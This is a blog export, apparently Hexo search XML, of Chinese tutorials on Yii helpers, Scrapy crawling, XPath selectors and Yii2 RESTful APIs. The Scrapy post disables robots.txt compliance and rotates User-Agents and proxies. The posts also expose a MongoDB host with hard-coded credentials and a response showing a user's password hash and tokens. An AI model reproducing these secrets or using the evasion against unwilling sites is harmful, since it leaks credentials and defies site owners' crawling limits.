function configure($object, $properties)&#123; foreach ($properties as $name =&gt; $value) &#123; $object-&gt;$name = $value; &#125; return $object;&#125; 获取对象属性与值 数组1234public static function getObjectVars($object)&#123; return get_object_vars($object);&#125; 获取Yii版本1234public static function getVersion()&#123; return '2.0.12';&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>别名</tag>
        <tag>自动加载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitbook等其他资源]]></title>
    <url>%2F2018%2F10%2F24%2Fothers%2F%E8%B5%84%E6%BA%90%2F</url>
    <content type="text"><![CDATA[gitbook资源爬虫笔记]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫-scrapy]]></title>
    <url>%2F2018%2F10%2F23%2Fspider%2Fscrapy%E5%8F%82%E8%80%83%2F</url>
    <content type="text"><![CDATA[实现项目创建项目1234567891011121314151617181920scrapy startproject cancao # 将会创建cankao项目目录及文件 └── cankao ├── cankao │ ├── __init__.py │ ├── items.py │ ├── middlewares.py │ ├── pipelines.py │ ├── settings.py │ └── spiders │ └── __init__.py └── scrapy.cfgscrapy.cfg # 项目的部署文件cankao/ # 项目的Python模块，将会从这里引用代码cankao/items.py # 项目的Item文件cankao/pipelines.py # 项目的管道文件用于文件持久化cankao/settings.py # 项目的配置文件cankao/middlewares.py # 中间件cankao/spiders/ # 存储爬虫代码目录 创建爬虫12345678910111213141516171819202122232425# 进入到项目目录cd cankao# 创建爬虫的命令 爬虫名称 限制的域名scrapy genspider cankao1 douban.com# spiders文件夹下生成cankao1.py文件# -*- coding: utf-8 -*-import scrapyclass Cankao1Spider(scrapy.Spider): # 爬虫名，必填 name = 'cankao1' # 允许访问的域名 allowed_domains = ['douban.com'] # 开始的url start_urls = ['http://douban.com/'] def parse(self, response): ''' 解析 :param response: :return: ''' pass 我们对网页进行分析获取需要的内容1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -*- coding: utf-8 -*-import scrapyfrom scrapy.http.request import Requestclass Cankao1Spider(scrapy.Spider): ''' 爬取豆瓣图书图片，单层爬虫 ''' # 爬虫名，必填 name = 'cankao1' # 允许访问的域名，只允许访问这个域名下的url allowed_domains = ['douban.com'] # 开始的url start_urls = ['https://book.douban.com/'] # 自定义配置，会覆盖项目配置 custom_settings = &#123;&#125; # def start_requests(self): # ''' # 重写父类的方法，父类的方法默认从start_urls中读取开始爬取 # 一般不需要重写，但是如果第一步就是登陆的话就需要重写了 # :return: # ''' def parse(self, response): ''' 解析 :param response: :return: ''' # 打印响应体 # print(response.body) papers = response.xpath('//*[@id="content"]/div/div[1]/div[1]/div[2]/div/div/ul[2]/li') # print(papers) for paper in papers: url = paper.xpath('.//div/a/@href').extract_first() img = paper.xpath('.//div/a/img/@src').extract_first() content = paper.xpath('.//div/div/a/text()').extract_first() print(url, img, content) # time.sleep(5000) # 分析下一个请求,进行请求（测试一下allowed_domains，不属于不能请求） # yield Request(url='http://www.bunao.win')``` #### 执行爬虫 执行爬虫命令 `scrapy crawl cankao1` ，执行后可以看到输出的执行信息，方便进行分析 此时可能并没有输出所期望的数据，我们需要修改配置参数 ```pythonsettings.py 文件 # 客户端 user-agent请求头USER_AGENT = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'# 是否遵守robot协议ROBOTSTXT_OBEY = False 此时，我们执行 scrapy crawl cankao1 --nolog 来查看不带执行信息的输入内容 创建item创建 item 就比较简单了，主要是用来存放保存信息的12345678910import scrapyclass CankaoItem(scrapy.Item): ''' 定义要保存的字段 ''' # define the fields for your item here like: url = scrapy.Field() img = scrapy.Field() content = scrapy.Field() 创建 pipeline , 存储数据数据保存到文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import jsonfrom scrapy.exceptions import DropItemclass CankaoPipeline(object): ''' 保存到文件中 ''' def __init__(self): self.file = open('./download/papers.json', 'wb') # def open_spider(self, spider): # ''' # spider是一个Spider对象，代表开启的Spider，当spider被开启时，调用这个方法 # 数据库/文件的开启可以放在这里 # :param spider: # :return: # ''' # pass def process_item(self, item, spider): ''' 处理item，进行保存 :param item: :param spider: :return: ''' print(item['img']) if item['img']: line = json.dumps(dict(item)) + '\n' # 要转成字节类型，写入文件 self.file.write(line.encode()) # 给下一个pipline处理 return item else: # 丢弃，后面的pipline也无法处理了 raise DropItem('miss img in %s' % item) def close_spider(self, spider): ''' spider被关闭的时候调用 可以放置数据库/文件关闭的代码 :param spider: :return: ''' # pass self.file.close() print('pipine open file times %s' % 5) # @classmethod # def from_crawler(cls, crawler): # ''' # 类方法，用来创建pipeline实例，可以通过crawler来获取scarpy所有的核心组件，如配置 # :param crawler: # :return: # ''' # pass 配置写好的 pipelines 需要配置激活123456settings.py# 激活pipline，从低到高开始执行ITEM_PIPELINES = &#123; 'cankao.pipelines.CankaoPipeline': 300,&#125; 数据保存到mongo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pymongo import MongoClientclass CankaoMongoPipeline(object): ''' 以mongo存储为例 ''' # 集合名 collection_name = 'scrapy_items' def __init__(self, mongo_uri, mongo_port, mongo_db): self.mongo_uri = mongo_uri self.mongo_port = mongo_port self.mongo_db = mongo_db @classmethod def from_crawler(cls, crawler): ''' 类方法，用来创建pipeline实例，可以通过crawler来获取scarpy所有的核心组件，如配置 :param crawler: :return: ''' return cls( # 获取mongo连接 mongo_uri = crawler.settings.get('MONGO_URI'), # 获取mongo连接 mongo_port = crawler.settings.get('MONGO_PORT'), # 获取数据库，如果没有则用默认的item mongo_db = crawler.settings.get('MONGO_DATABASE', 'fecshop_test') ) def open_spider(self, spider): ''' spider是一个Spider对象，代表开启的Spider，当spider被开启时，调用这个方法 数据库/文件的开启可以放在这里 :param spider: :return: ''' # 连接mongo self.client = MongoClient(self.mongo_uri, self.mongo_port) # 选择使用的数据库 db_auth = self.client[self.mongo_db] # 验证登陆 db_auth.authenticate("simpleUser", "simplePass") self.db = self.client[self.mongo_db] def process_item(self, item, spider): ''' 处理item，进行保存 :param item: :param spider: :return: ''' # 向集合中添加数据 self.db[self.collection_name].insert(dict(item)) return item def close_spider(self, spider): ''' spider被关闭的时候调用 可以放置数据库/文件关闭的代码 :param spider: :return: ''' self.client.close() 配置写好的 pipelines 需要配置激活123456789101112settings.py# 激活pipline，从低到高开始执行ITEM_PIPELINES = &#123; 'cankao.pipelines.CankaoPipeline': 300, 'cankao.pipelines.CankaoMongoPipeline': 500,&#125;# mongo的配置信息MONGO_URI = '118.25.38.240'MONGO_PORT = 27017MONGO_DATABASE = 'fecshop_test' 下载文件(自定义文件名)1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import scrapyfrom scrapy.pipelines.files import FilesPipelinefrom scrapy.http import Requestimport osclass CankaoFilesPipeline(FilesPipeline): ''' 下载文件 继承框架自带的FilesPipeline文件下载类 ''' def get_media_requests(self, item, info): ''' 重写此方法， 用来获取图片url进行下载 :param item: :param info: :return: ''' self.item = item yield scrapy.Request(item['img']) # def item_completed(self, results, item, info): # ''' # 下载完成后将会把结果送到这个方法 # :param results: # :param item: # :param info: # :return: # ''' # # print(results) # # ''' # results 为下载返回的数据, 如下 # [(True, &#123;'url': 'https://img3.doubanio.com/view/subject/m/public/s29816983.jpg', 'path': 'full/fced9acc2ecf23e0f96b9a2d9a442b02234f4388.jpg', 'checksum': 'ce0e7d543b37dbe3d21dd46ef8fcbd1b'&#125;)] # 图片下载成功时为True # url 源图片地址 # path 下载的文件路径 # checksum md5 hash # ''' # print(item) # print(info) def file_path(self, request, response=None, info=None): ''' 重写要保存的文件路径，不使用框架自带的hash文件名 :param request: :param response: :param info: :return: ''' def _warn(): from scrapy.exceptions import ScrapyDeprecationWarning import warnings warnings.warn('FilesPipeline.file_key(url) method is deprecated, please use ' 'file_path(request, response=None, info=None) instead', category=ScrapyDeprecationWarning, stacklevel=1) # check if called from file_key with url as first argument if not isinstance(request, Request): _warn() url = request else: url = request.url # 后缀 media_ext = os.path.splitext(url)[1] # 原名带后缀 media_content = url.split("/")[-1] # 使用item中的内容 # return 'full/%s%s' % (self.item['content'], media_ext) return 'full/%s' % (media_content) 配置写好的 pipelines 需要配置激活123456789101112131415settings.py# 激活pipline，从低到高开始执行ITEM_PIPELINES = &#123; 'cankao.pipelines.CankaoPipeline': 300, 'cankao.pipelines.CankaoMongoPipeline': 500, 'cankao.pipelines.CankaoFilesPipeline': 600,&#125;'''FilesPipeline 配置'''# 设置文件存放位置FILES_STORE = './download/files'# 设置文件过期时间30天FILES_EXPIRES = 30 12345678910111213141516171819202122232425262728293031323334353637import scrapyfrom scrapy.pipelines.images import ImagesPipelineclass CankaoImagesPipeline(ImagesPipeline): ''' 继承框架自带的ImagesPipeline图片下载类，可以下载的同时生成不同尺寸的图片放在配置的目录下 ''' def get_media_requests(self, item, info): ''' 重写此方法， 用来获取图片url进行下载 :param item: :param info: :return: ''' yield scrapy.Request(item['img']) # def item_completed(self, results, item, info): # ''' # 下载完成后将会把结果送到这个方法 # :param results: # :param item: # :param info: # :return: # ''' # print(results) # # ''' # results 为下载返回的数据, 如下 # [(True, &#123;'url': 'https://img3.doubanio.com/view/subject/m/public/s29827942.jpg', 'path': 'full/ad6acfdbef4d9df208c0e010ed1efcc287cb6225.jpg', 'checksum': 'c5d853689829ba8731cbb27146d89573'&#125;)] # 图片下载成功时为True # url 源图片地址 # path 下载的文件路径 # checksum md5 hash # ''' # print(item) # print(info) 配置写好的 pipelines 需要配置激活12345678910111213141516171819202122232425settings.py# 激活pipline，从低到高开始执行ITEM_PIPELINES = &#123; 'cankao.pipelines.CankaoPipeline': 300, 'cankao.pipelines.CankaoMongoPipeline': 500, 'cankao.pipelines.CankaoFilesPipeline': 600, 'cankao.pipelines.CankaoImagesPipeline': 700,&#125;'''ImagesPipeline 配置'''# 设置图片路径IMAGES_STORE = './download/images'# 制作缩略图IMAGES_THUMBS = &#123; 'small': (50, 50), 'big': (270, 270)&#125;# 设置图片过期时间30天IMAGES_EXPIRES = 30# 过滤下载图片的大小# 过滤条件：最小图片尺寸# IMAGES_MIN_HEIGH = 10# IMAGES_MIN_WIDTH = 10 创建中间件下载中间件实现 随机 USER_AGENT123456789101112131415161718192021222324252627282930313233343536373839import randomclass RandomUserAgent(object): ''' 使用随机 User-Agent的中间件 ''' def __init__(self, agents): self.agents = agents @classmethod def from_crawler(cls, crawler): ''' 通过这个类方法创建对象 :param crawler: :return: ''' ''' settings.py USER_AGENTS的值示例 USER_AGENTS = [ 'Mozilla/5.1 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', 'Mozilla/5.2 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', 'Mozilla/5.3 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', ] ''' # 获取配置文件settings中USER_AGENTS的值 return cls(crawler.settings.getlist('USER_AGENTS')) def process_request(self, request, spider): print('here') ''' 中间件请求过程中设置request :param request: :param spider: :return: ''' # 设置request的的User-Agent头 # setdefault 如果已经存在了就不会重新赋值了，所以中间件要靠前才生效 request.headers.setdefault("User-Agent", random.choice(self.agents)) 配置123456789101112settings.py # 下载中间件DOWNLOADER_MIDDLEWARES = &#123; 'cankao.middlewares.RandomUserAgent': 100, # 数值要小&#125;# 客户端 user-agent请求头 随机使用一个USER_AGENTS = [ 'Mozilla/5.1 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', 'Mozilla/5.2 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36', 'Mozilla/5.3 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36',] 下载中间件实现 随机代理1234567891011121314151617181920class RandomProxy(object): ''' 使用随机代理的中间件 ''' def __init__(self, iplist): self.iplist = iplist @classmethod def from_crawler(cls, crawler): return cls(crawler.settings.getlist('IPLIST')) def process_request(self, request, spider): ''' 给代理随机添加上一个代理 :param request: :param spider: :return: ''' proxy = random.choice(self.iplist) request.meta['proxy'] = proxy 配置同上 创建 cankao2 爬虫，并验证中间件，实现cookie管理1234567891011121314151617181920212223242526272829303132333435363738394041# -*- coding: utf-8 -*-import scrapyfrom scrapy.http.request import Requestimport randomclass Cankao2Spider(scrapy.Spider): ''' 测试随机User-agent头中间件和cookie管理 ''' name = 'cankao2' allowed_domains = ['wuxingxiangsheng.com'] # start_urls = ['http://temp.wuxingxiangsheng.com/test/request'] def start_requests(self): # cookiejar 参数用来自动管理cookie， 可以自动管理多个，根据cookiejar对应的值不同 return [Request('http://temp.wuxingxiangsheng.com/test/request', meta = &#123;'cookiejar':1&#125;)] def parse(self, response): ''' 解析 :param response: :return: ''' # 打印响应体 print(response.body) # print(papers) salt = random.random() # 获取响应的cookie print(response.headers.getlist('Set-Cookie')) # 获取cookiejar对应的值 1 print(response.meta['cookiejar']) # cookies 为自定义cookie值 meta = &#123;'cookiejar' 为自动管理的cookie yield Request(url='http://temp.wuxingxiangsheng.com/test/request?salt=%s' % salt, cookies=&#123;'test':'test'&#125;, meta = &#123;'cookiejar':response.meta['cookiejar']&#125;, callback=self.next) def next(self, response): # 获取请求携带的cookie， 自定义的加自动管理的 cookie = response.request.headers.getlist('Cookie') print('请求时携带请求的Cookies：', cookie) print(response.body) 如果cookie不能使用，请查看配置1COOKIES_ENABLED = True 其他debug 模式启动(调试) || 多爬虫启动调试需要通过IDE的debug模式启动由于通过终端直接执行爬虫命令无法调试，我们需要将执行爬虫的命令写在一个文件中然后执行创建文件 cankao3.py, 内容如下1234567891011121314151617181920212223242526272829from cankao.spiders.cankao1 import Cankao1Spiderfrom scrapy.utils.project import get_project_settingsfrom scrapy.crawler import CrawlerProcess'''启动爬虫, 可以通过debug模式启动(debug模式启动)，进行源码分析'''def my_run1(): ''' 启动单个爬虫，这里可以定制爬虫的配置 :return: ''' process = CrawlerProcess(get_project_settings()) process.crawl(Cankao1Spider) process.start()def my_run2(): ''' 启动多个爬虫，这里可以给每个爬虫定制配置 :return: ''' process = CrawlerProcess(get_project_settings()) process.crawl(Cankao1Spider) process.crawl(Cankao1Spider) process.start()if __name__ == '__main__': my_run1() 调试方法2 在项目根目录下新建 main.py 文件,用于调试12345from scrapy import cmdlinecmdline.execute('scrapy crawl sunwz'.split())执行程序python3 main.py 配置日志文件名和处理等级12LOG_FILE = "dg.log"LOG_LEVEL = "DEBUG" 下面给出如何使用 WARNING 级别来记录信息的例子:12from scrapy import loglog.msg("This is a warning", level=log.WARNING) 延时下载1DOWNLOAD_DELAY = 0.25 # 250 ms of delay 终端分析xpath是否正确 win系统无法使用,mac正常 12345671. 执行scrapy shell 'www.bunao.win' # 执行要分析页面地址 2. 获得返回数据后，执行 response.xpath('//a') # response对象就是上一步返回的对象，执行自己的xpath表达式，查看结果是否正确 也可以通过 view(response) # 将请求返回的网页再浏览器打开，再浏览器里测试xpath表达式 获取配置获取项目配置信息，如果没设置返回的是默认的配置信息 1234获取USER_AGENT配置信息，具体的配置字段查看setting文件F:\python\cankao&gt;scrapy settings --get USER_AGENTMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 项目地址 github 增量式爬虫(去重)用到了查一下，比较简单。这里记录一下防止忘记《python爬虫开发与项目实践 P372》]]></content>
      <categories>
        <category>python</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫-xpath]]></title>
    <url>%2F2018%2F10%2F23%2Fspider%2Fxpath%E5%8F%82%E8%80%83%2F</url>
    <content type="text"><![CDATA[语法w3c文档看过之后可以通过后面的 应用 部分理解一下 获得 xpath 路径通过chrome浏览器可以右键来查看 应用这里直接用的scrapy自带的解析器进行举例解析 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python# -*- coding:utf-8 -*-from scrapy.selector import Selectorfrom scrapy.http import HtmlResponsehtml = """&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head lang="en"&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; &lt;li class="item-"&gt;&lt;a id='i1' href="link.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-0"&gt;&lt;a id='i2' href="llink.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-1"&gt;&lt;a href="llink2.html"&gt;second item&lt;span&gt;vv&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;div&gt;&lt;a href="llink2.html"&gt;second item&lt;/a&gt;&lt;/div&gt; &lt;div&gt;&lt;a href="llink2.html"&gt;10&lt;/a&gt;&lt;/div&gt; &lt;div&gt; &lt;div class='test_div' &gt;test div&lt;/div&gt; &lt;ul&gt; &lt;li class="item-55"&gt;&lt;a id='i55' href="link.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-66"&gt;&lt;a id='i66' href="llink.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-77"&gt;&lt;a href="llink2.html"&gt;second item&lt;span&gt;vv&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/body&gt; &lt;ul&gt; &lt;li class="item-5"&gt;&lt;a id='i5' href="link.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-6"&gt;&lt;a id='i6' href="llink.html" class='ding'&gt;first item&lt;/a&gt;&lt;/li&gt; &lt;li class="item-7"&gt;&lt;a href="llink2.html"&gt;second item&lt;span&gt;vv&lt;/span&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/html&gt;"""# 构造response对象response = HtmlResponse(url='', body=html, encoding='utf-8')selector = Selector(response=response) 从根搜索12345# // 从根开始搜索# 获取所有a标签temp = selector.xpath('//a')# 搜索所有符合 div/div 的temp = selector.xpath('//div/div') 获取子标签123# 获取子标签# 获取不到，因为a标签不是html的子标签temp = selector.xpath('a') 相对父标签和绝对路径123456789101112131415161718192021222324# 相对位置绝对位置# 获取第一个body标签, 下面从body标签开始找ul标签x = selector.xpath('body')[0]# ./ul 相对标签的子标签ultemp = x.xpath('./ul')# print(temp)# 同上 相对于标签的子标签ultemp = x.xpath('ul')# print(temp)# .//ul 相对父标签(body)的所有子代ultemp = x.xpath('.//ul')# //ul 这个就不是相对的了，还是从根开始查找temp = x.xpath('//ul')# print(temp)# 相对temp = selector.xpath('body/div')[0].xpath('.//li')# print(temp)# 绝对 还是搜所有的，不依赖父标签temp = selector.xpath('body/div')[0].xpath('//li') 获取标签后代或子标签12345678# 获取body的子标签ultemp = selector.xpath('body/ul')# 获取body的所有后代标签ultemp = selector.xpath('body//ul')# 获取body的后代标签litemp = selector.xpath('body//li')# []空，li不是body的子标签temp = selector.xpath('body/li') 获取当前标签的父标签12# 获取body的父标签temp = selector.xpath('body')[0].xpath('..') 根据标签属性或者值进行搜索1234567891011121314# 获取包含class属性的标签temp = selector.xpath('//@class')# 获取属性class=item-0的标签temp = selector.xpath('//@class=item-0')# 拥有id属性的a标签temp = selector.xpath('body//a[@id]')# 标签a id属性为i1temp = selector.xpath('body//a[@id=i1]')# 标签div下a标签值为 second item 的div标签temp = selector.xpath('body//div[a="second item"]')# 获取属性class为ding并且属性href为llink.html的a标签temp = selector.xpath('//a[@class="ding"][@href="llink.html"]') 其他不常用1234567891011121314151617181920212223242526272829303132333435363738394041424344# 获取body的后代第一个li标签temp = selector.xpath('body//li[1]')# 获取body的后代最后一个li标签temp = selector.xpath('body//li[last()]')# 获取body的后代倒数第二个li标签temp = selector.xpath('body//li[last()-1]')# 获取body的后代前两个li标签temp = selector.xpath('body//li[position() &lt; 3]')# 标签div下a标签值小于30的div标签temp = selector.xpath('body//div[a &lt; 30]')# 匹配任何节点temp = selector.xpath('//*')# 匹配当前节点任何子节点temp = selector.xpath('*')# 匹配当前节点任何子节点包含属性的节点temp = selector.xpath('@*')# 匹配任何包含了属性的节点temp = selector.xpath('//@*')# 获取body子元素中的ul标签temp = selector.xpath('body/child::ul')# 获取body标签的父标签temp = selector.xpath('body/parent::*')# 获取body标签的祖先标签temp = selector.xpath('body/ancestor::*')# 获取body标签的祖先标签包含自己temp = selector.xpath('body/ancestor-or-self::*')# 获取body标签的后代标签temp = selector.xpath('body/descendant::*')# 获取body标签的后代标签为a的a标签temp = selector.xpath('body/descendant::a')# 获取body标签的后代标签包含自己temp = selector.xpath('body/descendant-or-self::*')# 获取body标签的同级标签temp = selector.xpath('body/preceding-sibling::*')# 获取class为item-0的li标签的下一个同级标签temp = selector.xpath('//li[@class="item-0"]/following-sibling::*')# 获取class为item-0的li标签后面的所有标签temp = selector.xpath('//li[@class="item-0"]/following::*')# 获取class为item-0的li标签前面的所有标签temp = selector.xpath('//li[@class="item-0"]/preceding::*')# 获取所有li节点的所有属性temp = selector.xpath('//li/attribute::*') 正则匹配属性值123456789101112# 获取属性href包含link的a标签temp = selector.xpath('//a[contains(@href, "link")]')# 获取属性href以llin开头的a标签temp = selector.xpath('//a[starts-with(@href, "llin")]')# 正则匹配 id属性符合正则的a标签temp = selector.xpath('//a[re:test(@id, "i\d+")]')# 正则匹配 id属性符合正则的a标签 获取标签内容，并转换成正常的列表temp = selector.xpath('//a[re:test(@id, "i\d+")]/text()').extract()# 正则匹配 id属性符合正则的a标签 获取标签href属性值，并转换成正常的列表temp = selector.xpath('//a[re:test(@id, "i\d+")]/@href').extract()# 正则匹配 id属性符合正则的a标签 获取标签href属性值，获取第一个值temp = selector.xpath('//a[re:test(@id, "i\d+")]/@href').extract_first() 获取标签内容或者属性值1234567# 获取标签内容，并转换成正常的列表temp = selector.xpath('//div/div/text()').extract()# 获取标签内容，获取列表中的第一个值temp = selector.xpath('//div/div/text()').extract_first()# 获取标签属性值，并转换成正常的列表temp = selector.xpath('//div/div/@class').extract()# print(temp)]]></content>
      <categories>
        <category>python</category>
        <category>xpath</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>scrapy</tag>
        <tag>爬虫</tag>
        <tag>xpath</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Yii-轻松实现RESTful风格的接口]]></title>
    <url>%2F2018%2F10%2F16%2Fyii%2FRESTful%2F</url>
    <content type="text"><![CDATA[Yii轻松实现RESTful风格的接口创建api模块我们可以直接复制一份其他的模块，如 frontend 模块，假设起名为 restful 修改配置首先我们修改一下配置，为了能够实现模块的自动加载12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849common\config\bootstrap.php// 添加的模块要在这里设置一下别名,为了自动加载Yii::setAlias('@restful', dirname(dirname(__DIR__)) . '/restful');``` 然后修改 restful 模块的配置 ```phprestful/config/main.php......return [ # 更改项目id 'id' =&gt; 'app-restful', # 设置控制器命名空间 'controllerNamespace' =&gt; 'restful\controllers', 'components' =&gt; [ 'request' =&gt; [ 'csrfParam' =&gt; '_csrf-restful', # 配置获取请求参数的格式，可以接收并解析json格式的数据 'parsers' =&gt; [ 'application/json' =&gt; 'yii\web\JsonParser', ] ], 'user' =&gt; [ 'identityClass' =&gt; 'common\models\User', // 不允许使用session 'enableSession' =&gt; false, ], ... ... 'urlManager' =&gt; [ 'enablePrettyUrl' =&gt; true, // 如果如开启，在不满足配置的路由规则后或使用默认的路由规则进行解析 // 'enableStrictParsing' =&gt; true, 'showScriptName' =&gt; false, 'rules' =&gt; [ /** * 配置url解析规则类 * controller 配置的控制器id 配置的控制器访问的时候要用复数的形式 */ ['class' =&gt; 'yii\rest\UrlRule', 'controller' =&gt; ['user']], ], ], ],]; 创建控制器创建控制器就更简单了12345678910111213141516171819202122namespace restful\controllers;use Yii;use yii\rest\ActiveController;class UserController extends ActiveController&#123; // 对应的模型类 public $modelClass = 'common\models\User';&#125;``` 此时，一个简单的RESTful风格的接口已经创建好了，我们肯定不能止步于此，下面我们具体分析一下 ## 解析&amp;&amp;实战操作 ### 配置 先看配置的 `Request` 组件，为了能够解析请求体数据为json格式 ```php'request' =&gt; [ 'parsers' =&gt; [ 'application/json' =&gt; 'yii\web\JsonParser', ]] info： 上述配置是可选的。若未按上述配置，API 将仅可以分辨 application/x-www-form-urlencoded 和 multipart/form-data 输入格式。也就是通过 $_POST 进行获取参数。 我们可以看一下 Request 类的 getBodyParams 方法，方法中会根据请求的 Content-Type 来用不同的解析器解析请求参数，这里配置的 &#39;application/json&#39; =&gt; &#39;yii\web\JsonParser&#39; 就是为了能够在请求头参数为 Content-Type:application/json 时请求体的json数据能够很好的被解析 路由配置常用的参数如下123456789101112131415161718192021222324252627282930313233343536373839404142'urlManager' =&gt; [ 'enablePrettyUrl' =&gt; true, // restful模式最好开启，如果路由规则不满足也不会使用默认的解析规则，直接返回异常 // 'enableStrictParsing' =&gt; true, 'showScriptName' =&gt; false, // 配置url解析规则类 'rules' =&gt; [ /** * controller 配置的控制器id 配置的控制器访问的时候要用复数的形式 * 如：GET users */ ['class' =&gt; 'yii\rest\UrlRule', 'controller' =&gt; ['user']], /** * 配置控制器ID 的映射。 * 访问格式如：GET u */ // ['class' =&gt; 'yii\rest\UrlRule', 'controller' =&gt; ['u' =&gt; 'user']], /** * 其他常用的配置。 * */ [ 'class' =&gt; 'yii\rest\UrlRule', 'controller' =&gt; 'product', // 用来禁止复数形式 // 'pluralize' =&gt; false, // 只有delete允许请求，如果请求，将会返回404 // 'only' =&gt; ['delete'], // 排除对index的请求，其他的都可以，如果请求，将会返回请求options的结果 // 'except' =&gt; ['index'], // 排除对delete的请求，其他的都可以，如果请求，将会返回请求options的结果 'except' =&gt; ['delete'], // 配置额外自定义的访问 // 访问格式如 POST /products/search 可以支持新行为 search 'extraPatterns' =&gt; [ 'POST search' =&gt; 'search', ], // 指定模块，可以理解成版本 // 'prefix' =&gt; 'v1', ], ],] 看一下 yii\rest\UrlRUle 路由为我们做了什么123456789public $patterns = [ 'PUT,PATCH &#123;id&#125;' =&gt; 'update', 'DELETE &#123;id&#125;' =&gt; 'delete', 'GET,HEAD &#123;id&#125;' =&gt; 'view', 'POST' =&gt; 'create', 'GET,HEAD' =&gt; 'index', '&#123;id&#125;' =&gt; 'options', '' =&gt; 'options',]; 这部分是yii为我们配置的默认的路由，什么方式的请求指定到对应的 action 资源设置可以根据url上设置参数来获取指定的字段值, 看一下官方案例1234567891011// 返回fields()方法中申明的所有字段，默认是所有字段http://localhost/users// 只返回fields()方法中申明的id和email字段http://localhost/users?fields=id,email// 返回fields()方法申明的所有字段，以及extraFields()方法中的profile字段http://localhost/users?expand=profile// 返回回fields()和extraFields()方法中提供的id, email 和 profile字段http://localhost/users?fields=id,email&amp;expand=profile fields() 方法默认返回的是表解析出来的所有字段extraFields() 方法需要自己写，返回的是关联的属性 覆盖 fields() 方法官方案例123456789101112131415161718192021222324252627// 明确列出每个字段，适用于你希望数据表或// 模型属性修改时不导致你的字段修改（保持后端API兼容性）public function fields()&#123; return [ // 字段名和属性名相同 'id', // 字段名为"email", 对应的属性名为"email_address" 'email' =&gt; 'email_address', // 字段名为"name", 值由一个PHP回调函数定义 'name' =&gt; function ($model) &#123; return $model-&gt;first_name . ' ' . $model-&gt;last_name; &#125;, ];&#125;// 过滤掉一些字段，适用于你希望继承// 父类实现同时你想屏蔽掉一些敏感字段public function fields()&#123; $fields = parent::fields(); // 删除一些包含敏感信息的字段 unset($fields['auth_key'], $fields['password_hash'], $fields['password_reset_token']); return $fields;&#125; 覆盖 extraFields() 方法要想返回关联属性，需要让 extraFields() 方法返回关联属性，如下123456789101112131415161718restful\models\ProductModel/** * 返回需要关联的属性 也就是getUser的缩写 * @return [type] [description] */public function extraFields()&#123; return ['user'];&#125;/** * 关联 * @return [type] [description] */public function getUser()&#123; return $this-&gt;hasOne(User::className(), [ 'id' =&gt; 'order']);&#125; 请求 ：GET rest.yiilearn.com/products?fields=product_id,purchase_id&amp;expand=user123456789101112131415161718192021222324[ &#123; "product_id": "2605", "purchase_id": "1", "user": &#123; "id": 1, "username": "ibunao", "auth_key": "Ah5hD1y-TD0B3VUjoYufZhYoP1ayPTvP", "password_hash": "$2y$13$hgTMEkDth8QSY4DJoK30hu8Z282YhOR8pdGlXjIeVYORP3OkeODpi", "password_reset_token": "mfpKVvJ_QbX2fL0PI7Pyqtb-yqP0D0GZ_1539051580", "email": "******@qq.com", "status": 10, "created_at": 1539050271, "updated_at": 1539585374, "allowance": "0", "allowance_updated_at": "1539585374" &#125; &#125;, &#123; "product_id": "2606", "purchase_id": "1", "user": null &#125;] 可以看到，expand的参数生效了，但是返回的数据有太多，我们缩减一下1234567common\models\User# 添加fields方法 public function fields()&#123; return ['id', 'username'];&#125; 返回结果123456789101112131415[ &#123; "product_id": "2605", "purchase_id": "1", "user": &#123; "id": 1, "username": "ibunao" &#125; &#125;, &#123; "product_id": "2606", "purchase_id": "1", "user": null &#125;] AR这种联表方式还是有点复杂的，不推荐。可以参考下面的自定义部分 控制器设置控制器需要改变的比较少，无非就是添加一些路由配置的额外的要实现的 action，覆盖一些 behavior ，重写一下检查权限的方法 